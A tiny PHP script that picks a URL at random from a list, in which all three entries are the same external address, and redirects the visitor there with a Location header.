<?php

$arr = array(

'http://www.xsedh.xyz/',

'http://www.xsedh.xyz/',

'http://www.xsedh.xyz/'


);

$key = array_rand($arr, 1);

//输出随机内容

// echo $arr[$key];

header('Location: ' . $arr[$key]);

exit;

?>